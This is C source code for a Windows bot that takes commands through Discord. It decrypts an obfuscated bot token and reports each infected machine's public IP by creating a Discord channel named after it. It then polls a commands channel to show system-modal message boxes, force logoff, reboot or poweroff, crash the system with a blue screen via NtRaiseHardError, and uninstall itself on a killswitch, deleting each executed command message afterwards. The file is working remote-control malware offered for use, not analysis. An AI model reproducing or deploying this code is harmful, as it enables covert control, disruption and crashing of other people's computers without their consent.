#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include "bot.h"
#include "dev.h"

#pragma comment(lib, "winhttp.lib")

RtlAdjustPrivilege_t RtlAdjustPrivilege = NULL;
NtRaiseHardError_t NtRaiseHardError = NULL;

static void decrypt(char* out, const uint32_t* in, size_t len) {
    for (size_t i = 0; i < len; i++) {
        out[i] = (char)(in[i] ^ KEY);
    }

    out[len] = 0;
}

typedef struct {
    char name[128];
    char id[64];
} ChannelCache;

static ChannelCache cache[64];
static int cache_count = 0;
static char channel_id[64];

static char* http_request(const wchar_t* host, const wchar_t* path, const wchar_t* method, const char* body) {
    HINTERNET hSession = WinHttpOpen(L"dc/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, method, path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    wchar_t auth[256];
    char token[256];
    decrypt(token, (const uint32_t[])BOT_TOKEN, 72);
    swprintf(auth, 256, L"Authorization: Bot %hs", token);
    SecureZeroMemory(token, sizeof(token));

    WinHttpAddRequestHeaders(hRequest, auth, -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);

    if (body) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)body, strlen(body), strlen(body), 0);
    } else {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, 0);
    }

    WinHttpReceiveResponse(hRequest, NULL);

    char* buffer = NULL;
    DWORD totalRead = 0;
    DWORD size = 0;

    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        buffer = (char*)realloc(buffer, totalRead + size + 1);
        if (!buffer) break;
        DWORD read = 0;
        WinHttpReadData(hRequest, buffer + totalRead, size, &read);
        totalRead += read;
    }
    if (buffer) buffer[totalRead] = 0;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

static const char* cache_get(const char* name) {
    for (int i = 0; i < cache_count; i++) {
        if (!strcmp(cache[i].name, name))
            return cache[i].id;
    }
    return NULL;
}

static void cache_put(const char* name, const char* id) {
    if (cache_count >= 64) return;

    strcpy(cache[cache_count].name, name);
    strcpy(cache[cache_count].id, id);
    cache_count++;
}

int get_public_ip(char* out, DWORD out_size) {
    HINTERNET hSession = WinHttpOpen(
        L"ip-fetch",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return 0;

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        L"api.ipify.org",
        INTERNET_DEFAULT_HTTP_PORT,
        0
    );

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        L"/",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    BOOL ok = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    DWORD size = 0;
    DWORD downloaded = 0;

    if (ok) {
        if (WinHttpQueryDataAvailable(hRequest, &size) && size < out_size) {
            WinHttpReadData(hRequest, out, size, &downloaded);
            out[downloaded] = '\0';
        } else {
            ok = 0;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return ok ? 1 : 0;
}

static char* create_channel(const char* name) {
    static char id[64];

    char path[256];
    sprintf(path, "/api/v10/guilds/%s/channels", SERVER_ID);

    char body[256];
    sprintf(body,
        "{\"name\":\"%s\",\"type\":0,\"parent_id\":\"%s\"}",
        name,
        CATEGORY_ID
    );

    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512);

    char* res = http_request(L"discord.com", wpath, L"POST", body);

    char* i = strstr(res, "\"id\":\"");
    if (i) {
        i += 6;
        sscanf(i, "%63[^\"]", id);

        cache_put(name, id);
    }

    free(res);
    return id;
}

static void json_escape(const char* src, char* dst, size_t dst_size) {
    size_t j = 0;
    for (size_t i = 0; src[i] && j + 2 < dst_size; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '"'  && j + 2 < dst_size) { dst[j++] = '\\'; dst[j++] = '"'; }
        else if (c == '\\' && j + 2 < dst_size) { dst[j++] = '\\'; dst[j++] = '\\'; }
        else if (c == '\n' && j + 2 < dst_size) { dst[j++] = '\\'; dst[j++] = 'n'; }
        else if (c == '\r' && j + 2 < dst_size) { dst[j++] = '\\'; dst[j++] = 'r'; }
        else if (c == '\t' && j + 2 < dst_size) { dst[j++] = '\\'; dst[j++] = 't'; }
        else if (c < 0x20) { /* skip */ }
        else { dst[j++] = src[i]; }
    }
    dst[j] = '\0';
}

static int send_message(const char* id, const char* text) {
    char path[256];
    sprintf(path, "/api/v10/channels/%s/messages", id);

    size_t text_len = strlen(text);
    char* escaped = (char*)malloc(text_len * 2 + 1);
    if (!escaped) return 0;
    json_escape(text, escaped, text_len * 2 + 1);

    size_t body_size = strlen(escaped) + 32;
    char* body = (char*)malloc(body_size);
    if (!body) { free(escaped); return 0; }
    sprintf(body, "{\"content\":\"%s\"}", escaped);
    free(escaped);

    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512);
    char* res = http_request(L"discord.com", wpath, L"POST", body);
    free(body);

    int channel_gone = res && strstr(res, "10003");
    free(res);
    return channel_gone ? 0 : 1;
}

/*

cmd format:

/killswitch id:<channel_id> confirm:<code>
/msgbox id:<channel_id> title:<title> text:<text> type:[info|warn|error]
/shutdown id:<channel_id> type:[logoff|reboot|poweroff|sleep|bsod]
/disable id:<channel_id>
/enable id:<channel_id>

*/

static char* fetch_messages(const char* channel_id, int limit) {
    char path[256];
    sprintf(path, "/api/v10/channels/%s/messages?limit=%d", channel_id, limit);
    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512);
    return http_request(L"discord.com", wpath, L"GET", NULL);
}

static bool parse_command(const char* content, Command* cmd) {
    memset(cmd, 0, sizeof(Command));
    cmd->disabled = -1;
    cmd->shutdown = SHUTDOWN_TYPE_NONE;

    printf("Parsing command: %s\n", content);

    if (strncmp(content, "/killswitch", 11) == 0) {
        char* c = strstr(content, "confirm:");
        if (c) {
            sscanf(c + 8, "%llu", &cmd->killswitch);
            return true;
        }
    }
    if (strncmp(content, "/msgbox", 7) == 0) {
        cmd->msgbox.type = MSGBOX_TYPE_INFO;

        char* t = strstr(content, "title:");
        if (t) {
            t += 6;
            if (*t == '"') {
                t++;
                sscanf(t, "%127[^\"]", cmd->msgbox.title);
            } else {
                sscanf(t, "%127[^ ]", cmd->msgbox.title);
            }
        }

        char* x = strstr(content, "text:");
        if (x) {
            x += 5;
            if (*x == '"') {
                x++;
                sscanf(x, "%511[^\"]", cmd->msgbox.text);
            } else {
                char* end = x;
                while (*end) {
                    if (*end == ' ' && *(end+1) && strchr("abcdefghijklmnopqrstuvwxyz", *(end+1))) {
                        char* colon = strchr(end+1, ':');
                        char* space = strchr(end+1, ' ');
                        if (colon && (!space || colon < space)) break;
                    }
                    end++;
                }
                int len = (int)(end - x);
                if (len > 511) len = 511;
                strncpy(cmd->msgbox.text, x, len);
                cmd->msgbox.text[len] = 0;
            }
        }

        if (strstr(content, "type:warn"))  cmd->msgbox.type = MSGBOX_TYPE_WARN;
        if (strstr(content, "type:error")) cmd->msgbox.type = MSGBOX_TYPE_ERROR;
        return true;
    }
    if (strncmp(content, "/shutdown", 9) == 0) {
        if (strstr(content, "type:logoff"))   cmd->shutdown = SHUTDOWN_TYPE_LOGOFF;
        if (strstr(content, "type:reboot"))   cmd->shutdown = SHUTDOWN_TYPE_REBOOT;
        if (strstr(content, "type:poweroff")) cmd->shutdown = SHUTDOWN_TYPE_POWEROFF;
        if (strstr(content, "type:sleep"))    cmd->shutdown = SHUTDOWN_TYPE_SLEEP;
        if (strstr(content, "type:bsod"))     cmd->shutdown = SHUTDOWN_TYPE_BSOD;
        return true;
    }
    if (strncmp(content, "/disable", 8) == 0) { cmd->disabled = 0; return true; }
    if (strncmp(content, "/enable", 7) == 0)  { cmd->disabled = 1; return true; }

    return false;
}

static void delete_message(const char* msg_id) {
    printf("Attempting to delete message with id: '%s'\n", msg_id);
    if (!msg_id || !msg_id[0]) return;

    printf("Deleting executed command message with id: '%s'\n", msg_id);

    char path[256];
    sprintf(path, "/api/v10/channels/%s/messages/%s", COMMANDS_ID, msg_id);
    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512);

    char* res = http_request(L"discord.com", wpath, L"DELETE", NULL);
    free(res);
}

static void execute_command(Command* cmd) {
    if (cmd->__executed) return;

    if (cmd->killswitch) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Killswitch activated for machine id:%s.", channel_id);
        send_dc_msg(msg);
        delete_message(cmd->__id);
        int c = uninstall(cmd->killswitch);
        if (c == 0) {
            ExitProcess(0);
        } else {
            printf("Invalid killswitch code (%llu). Exited with %d\n", cmd->killswitch, c);
        }
    }

    if (cmd->msgbox.text[0]) {
        UINT flags = MB_OK | MB_SYSTEMMODAL;
        if (cmd->msgbox.type == MSGBOX_TYPE_WARN)  flags |= MB_ICONWARNING;
        if (cmd->msgbox.type == MSGBOX_TYPE_ERROR) flags |= MB_ICONERROR;
        MessageBoxA(NULL, cmd->msgbox.text, cmd->msgbox.title[0] ? cmd->msgbox.title : "Alert", flags);
    }

    if (cmd->shutdown) {
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            TOKEN_PRIVILEGES tkp = {0};
            LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
            CloseHandle(hToken);
        }

        switch (cmd->shutdown) {
            case SHUTDOWN_TYPE_LOGOFF:   ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0); break;
            case SHUTDOWN_TYPE_REBOOT:   ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0); break;
            case SHUTDOWN_TYPE_POWEROFF: ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0); break;
            case SHUTDOWN_TYPE_SLEEP:    SetSystemPowerState(TRUE, TRUE); break;
            case SHUTDOWN_TYPE_BSOD:
            {
                BOOLEAN bEnabled = FALSE;
                ULONG response = 0;
                RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);  // SeShutdownPrivilege
                NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
                break;
            }
        }
    }

    if (cmd->disabled != -1) {
        set_disabled(cmd->disabled == 0);
    }

    cmd->__executed = true;
}

static int extract_json_string(const char* p, char* out, int max_len) {
    int i = 0;
    while (*p && i < max_len - 1) {
        if (*p == '\\' && *(p+1) == '"') {
            out[i++] = '"';
            p += 2;
        } else if (*p == '\\' && *(p+1) == '\\') {
            out[i++] = '\\';
            p += 2;
        } else if (*p == '\\' && *(p+1) == 'n') {
            out[i++] = '\n';
            p += 2;
        } else if (*p == '"') {
            break;
        } else {
            out[i++] = *p++;
        }
    }
    out[i] = 0;
    return i;
}

void get_commands_to_exec(Command* out, int* out_count) {
    *out_count = 0;
    if (!COMMANDS_ID[0]) return;

    char* json = fetch_messages(COMMANDS_ID, 25);
    if (!json) return;

    char* p = json;
    while ((p = strstr(p, "\"content\":\""))) {
        p += 11;

        char content[1024] = {0};
        extract_json_string(p, content, sizeof(content));

        while (*p && !(*p == '"' && *(p-1) != '\\')) p++;

        char target_id[64] = {0};
        char* id_pos = strstr(content, "id:");
        if (id_pos) sscanf(id_pos + 3, "%63[^ ]", target_id);

        if (target_id[0] && strcmp(target_id, channel_id) == 0) {
            Command cmd = {0};
            if (parse_command(content, &cmd)) {
                char* id_start = strstr(p, "\"id\":\"");
                if (id_start) {
                    id_start += 6;
                    sscanf(id_start, "%31[^\"]", cmd.__id);
                }

                out[*out_count] = cmd;
                (*out_count)++;
                if (*out_count >= 16) break;
            }
        }
        p++;
    }
    free(json);
}

void process_commands() {
    Command local_cmds[128];
    int count = 0;

    get_commands_to_exec(local_cmds, &count);

    for (int i = 0; i < count; i++) {
        execute_command(&local_cmds[i]);
    }

    if (count > 0) {
        delete_executed_messages(local_cmds, count);
    }
}

void delete_executed_messages(Command* cmds, int count) {
    for (int i = 0; i < count; i++) {
        if (cmds[i].__executed) {
            delete_message(cmds[i].__id);
        }
    }
}

void command_executed(Command* cmd) {
    cmd->__executed = true;
}

void init_bot() {
    get_channel_id(channel_id, sizeof(channel_id));
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
}

void send_dc_msg(char* msg_text) {
    static char ip[64];
    if (!get_public_ip(ip, sizeof(ip))) {
        strncpy(ip, "unknown", sizeof(ip));
    }

    for (char* p = ip; *p; p++)
        if (*p == '.') *p = '-';

    if (!channel_id[0]) {
        strncpy(channel_id, create_channel(ip), sizeof(channel_id));
        save_channel_id(channel_id);
    }

    printf("Sending message to channel '%s' (id: '%s')\n", ip, channel_id);

    if (!send_message(channel_id, msg_text)) {
        printf("Channel gone, recreating...\n");
        channel_id[0] = '\0';
        strncpy(channel_id, create_channel(ip), sizeof(channel_id));
        save_channel_id(channel_id);
        send_message(channel_id, msg_text);
    }
}